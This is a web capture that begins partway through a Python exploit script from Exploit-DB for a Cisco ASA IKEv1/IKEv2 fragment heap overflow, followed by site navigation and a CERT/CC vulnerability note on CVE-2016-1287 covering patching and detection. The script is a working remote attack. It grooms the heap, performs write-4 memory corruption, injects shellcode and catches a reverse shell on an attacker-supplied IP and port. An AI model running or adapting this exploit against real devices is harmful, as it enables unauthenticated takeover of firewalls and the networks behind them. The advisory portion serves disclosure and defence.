            payload += option * n
        buf += payload

        packet = buf.replace("ABCD", struct.pack(">L", len(buf))).replace("EF", struct.pack(">H", total))

        return packet

class Exploit(object):
    def __init__(self, host, revHost, revPort = 4444):
        self._host = host
        self._port = 500
        self._revHost = revHost
        self._revPort = revPort
        self._sessions = []

    # Create a new SA session
    def create_SA(self, id = None):

        # Create a new socket for session
        sess = Session((self._host, self._port), id)

        # Append to session list
        self._sessions.append(sess)

        return sess

    # Interact with reverse shell
    def interact(self):
        from telnetlib import Telnet

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        s.bind((self._revHost, self._revPort))
        s.listen(5)
        cli = s.accept()[0]
        s.close()
        print("[+] Got connect-back")

        t = Telnet()
        t.sock = cli
        t.interact()

    def buildPayload(self, cli = False):
        if cli == False:
            buf = bytearray(shShellcode)
            # Adjust IP and port
            buf[0x1ad:0x1b1] = socket.inet_aton(self._revHost)
            buf[0x1b5:0x1b7] = struct.pack(">H", self._revPort)
            Shellcode = bytes(buf)
        else:
            Shellcode = cliShellcode.replace("@IP@", self._revHost).replace("@PORT@", str(self._revPort))

        return Shellcode

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("[+] Usage: {0:s} <cisco IP> <attacker IP>[:port]".format(sys.argv[0]))
        sys.exit(0)

    #TODO: Check host
    host = sys.argv[1]
    revHost = sys.argv[2]

    # Parse revHost
    port = 4444
    if revHost.rfind(":") != -1:
        revHost, port = revHost.split(":")
        port = int(port)

    exploit = Exploit(host, revHost, port)
    sess1 = exploit.create_SA()
    sess2 = exploit.create_SA()

    n = 0xd6
    sess2.send_fragment(0x8 + n + 3, 1, 5, 0, "A" * (n + 3))

    # Send packets which will trigger the vulnerability
    # Weird packet to get a size of 0x1
    sess2.send_fragment(8 + -7, 0, 6, 1, "A" * (256 - 7))

    # This fragment will be the one being copied
    # during the memory corruption
    buf = "A" * (n - 0xd + 0x3)
    buf += struct.pack("<I", 0xef000000)
    buf += struct.pack("<I", 0x00a11ccd) # chunk magics
    buf += struct.pack("<I", 0xe100d4d0)
    buf += struct.pack("B", 0x61)       # set size from 0x31 to 0x61 in order to encompass the
                                        # adjacent chunk on free
    sess2.send_fragment(8 + n + 3, 1, 6, 0, buf)

    sess1.send_fragment(0x8 + 0xf8, 1, 0xeb, 0, "A" * 0xf8)
    pkt = sess1.make_cisco_option_list((
        (0xd0, 0x30),
        )
    )

    # Defragment heap
    sess1.send(pkt)
    sess1.send(pkt)
    sess1.send(pkt)

    # Prepare a fake chunk
    buf  = ""
    buf += struct.pack("<I", 0x60)
    buf += struct.pack("<I", 0x102)
    buf += struct.pack("<I", 0xa11c0123)
    buf += struct.pack("<I", 0xe0)
    buf += "A" * 0xe8

    # And allocate it right after a 0x100 bytes hole
    sess1.send_fragment(0x8 + 0xf8, 2, 0xeb, 0, buf)

    # Trigger the overflow
    sess2.send_fragment(8 + -7, 3, 6, 1, "A" * (256 - 7))

    # Retrieve of fake freed block
    #buf = "\xcc" * (0xd0 - len(buf))
    buf = "\x00" * 0xd0

    buf += struct.pack("<I", 0xe100d4d0)
    buf += struct.pack("<I", 0x31)

    # this is a special writable address in the process
    # it translate into the following executable code:
    # nop / jmp [ecx]
    # since ecx happens to hold a pointer to a controlled buffer
    # the execution flow will be redirected to attacker controlled data
    what = 0xc821ff90

    # Just some writable address in the process which doesn't seem to be used
    where = 0xc8002000 - 0x8

    buf += struct.pack("<I", what)
    buf += struct.pack("<I", where)
    buf += struct.pack("<I", 0xf3ee0123)
    buf += struct.pack("<I", 0x0) * 5
    buf += struct.pack("<I", 0x5ee33210)
    buf += struct.pack("<I", 0xf3eecdef)
    buf += struct.pack("<I", 0x30)
    buf += struct.pack("<I", 0x132)
    buf += struct.pack("<I", 0xa11c0123)
    buf += struct.pack("<I", 0x100)
    buf += struct.pack("<I", 0x0) * 2

    # Second write-4 pointers
    # This is the address of the pointer to the "list_add" function
    # which will give us control of execution flow
    where = 0x0A99B7A4 - 0x10

    # This is the address where the opcode sequence "nop / jmp [ecx]" is located
    what = 0xc8002000

    buf += struct.pack("<I", what)
    buf += struct.pack("<I", where)

    buf += "\x00" * (0x128 - len(buf))

    # Try to chain a config list and a fragment packet
    packet = bytearray()
    packet += sess1._id               # Initiator SPI (random)
    packet += sess1._cookie                # Responder SPI
    packet += "\x2f"                   # next payload option list
    packet += "\x20"                   # version
    packet += "\x25"                   # exchange type (2=identify protection)
    packet += "\x08"                   # flags
    packet += struct.pack(">I", 1)       # message ID
    packet += "XXXX"                   # total length including header

    payload = bytearray()
    payload += "\x00"               # next payload (frag)
    payload += "\x00"               # critical bit
    payload += "\x00\x00" 	    # payload length
    payload += "\x03"               # CFG_SET
    payload += "\x00\x00\x00"       # Reserved

    size = 0x130
    option  = struct.pack(">H", 0x8400)  #id
    option += struct.pack(">H", size)    # data length
    option += "\x90" * 0x8 + buf

    payload += option * 0x10

    # Update payload length
    payload[2:4] = struct.pack(">H", len(payload))

    packet += payload

    # Update payload length
    packet[0x18:0x1C] = struct.pack(">I", len(packet))

    packet = bytes(packet)

    # Reallocate the fake freed 0x130 bytes chunk with controlled data
    # this way we can perform a write-4 memory corruption when freeing
    # the subsequent memory
    sess1.send(packet)

    time.sleep(0.2)
    #raw_input()
    packet = bytearray()
    packet += sess1._id               # Initiator SPI (random)
    packet += sess1._cookie                # Responder SPI
    packet += "\x84"                   # next payload option list
    packet += "\x20"                   # version
    packet += "\x25"                   # exchange type (2=identify protection)
    packet += "\x08"                   # flags
    packet += struct.pack(">I", 1)       # message ID
    packet += "XXXX"                   # total length including header

    buf = exploit.buildPayload(cli = True)

    flength = len(buf) + 0x8
    fragid = 0xeb
    seqno = 0x5
    lastfrag = 0
    payload = bytearray()
    # Jump over garbage directly into shellcode (interpreted as jmp +0x6)
    payload += "\xeb"               # next payload (none)
    payload += "\x06"               # critical bit
    payload += struct.pack(">H", flength) 		#payload_len)  # length
    payload += struct.pack(">H", fragid)        # frag ID
    payload += struct.pack("B", seqno)         # frag sequence
    payload += struct.pack("B", lastfrag)
    payload += buf

    packet += payload

    # Update payload length
    packet[0x18:0x1C] = struct.pack(">I", len(packet))

    packet = bytes(packet)

    # Trigger the 2 write-4 and get code execution
    sess1.send(packet)

    # Hopefully we'll get something interesting
    exploit.interact()

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.kb.cert.org_b1e9330c_20250125_200505.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#327976

## Cisco Adaptive Security Appliance (ASA) IKEv1 and IKEv2 contains a buffer overflow vulnerability

#### Vulnerability Note VU#327976

Original Release Date: 2016-02-11 | Last Revised: 2016-02-16

---

### Overview

Cisco Adaptive Security Appliance (ASA) Internet Key Exchange versions 1 and 2 (IKEv1 and IKEv2) contains a buffer overflow vulnerability that may be leveraged to gain remote code execution.

### Description

| [**CWE-119**](https://cwe.mitre.org/data/definitions/119.html)**: Improper Restriction of Operations within the Bound of a Memory Buffer -** CVE-2016-1287  According to the [advisory by Exodus Intelligence](https://blog.exodusintel.com/2016/01/26/firewall-hacking/):*The algorithm for re-assembling IKE payloads fragmented with the Cisco fragmentation protocol contains a bounds-checking flaw that allows a heap buffer to be overflowed with attacker-controlled data. A sequence of payloads with carefully chosen parameters causes a buffer of insufficient size to be allocated in the heap which is then overflowed when fragment payloads are copied into the buffer. Attackers can use this vulnerability to execute arbitrary code on affected devices.*Systems that are configured to terminate IKEv1 and IKEv2 VPN connections are vulnerable to exploitation. The [Cisco security advisory](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160210-asa-ike) describes how to determine if a system is configured in a vulnerable manner by checking the running crypto maps. |
| --- |

### Impact

| By sending specially crafted UDP packets directly to affected devices, a remote, unauthenticated attacker may be able to execute arbitrary code and gain full control of affected systems. |
| --- |

### Solution

| **Apply an update**Cisco [has issued updates](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160210-asa-ike) for several versions of ASA to address this vulnerability. Users are encouraged to update to the latest version.Note that Cisco ASA versions 7.2, 8.2, 8.3, and 8.6 are affected but no longer supported by the vendor. Users of these versions should strongly consider migrating to a supported solution. |
| --- |

| **Detect and filter malicious packets**According to the advisory by Exodus Intelligence:*Looking for the value of the length field of a Fragment Payload (type 132) IKEv2 or IKEv1 packet allows detecting an exploitation attempt. Any length field with a value < 8 must be considered as an attempt to exploit the vulnerability. The detection also has to deal with the fact that the multiple payloads can be chained inside an IKEv2 packet, and that the Fragment Payload may not be the only/first payload of the packet.*Network administrators may consider implementing rules to detect or block attacks. |
| --- |

### Vendor Information

327976
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23327976/) to view vendors.**
### [Cisco](#JLAD-A72LZG) Affected

Updated:  February 11, 2016

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### Vendor References

* <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160210-asa-ike>

### Addendum

Cisco ASA versions 7.2, 8.2, 8.3, 8.4, 8.6, 8.7, 9.0, 9.1, 9.2, 9.3, 9.4, and 9.5 are affected. Note that versions 7.2, 8.2, 8.3, and 8.6 are end of life and will not receive updates addressing this vulnerability.

If you have feedback, comments, or additional information about this vulnerability, please send us email.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 10 | AV:N/AC:L/Au:N/C:C/I:C/A:C |
| Temporal | 7.8 | E:POC/RL:OF/RC:C |
| Environmental | 5.9 | CDP:ND/TD:M/CR:ND/IR:ND/AR:ND |

### References

* <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160210-asa-ike>
* <https://blog.exodusintel.com/2016/01/26/firewall-hacking/>
* <https://cwe.mitre.org/data/definitions/119.html>
* <http://blog.snort.org/2016/02/coverage-for-cve-2016-1287-in-snort.html>
### Acknowledgements

Cisco credits David Barksdale, Jordan Gruskovnjak, and Alex Wheeler of Exodus Intelligence for reporting this vulnerability.

This document was written by Joel Land.

### Other Information

| **CVE IDs:** | [CVE-2016-1287](http://web.nvd.nist.gov/vuln/detail/CVE-2016-1287) |
| --- | --- |
| **Date Public:** | 2016-02-11 |
| **Date First Published:** | 2016-02-11 |
| **Date Last Updated:** | 2016-02-16 18:35 UTC |
| **Document Revision:** | 15 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800


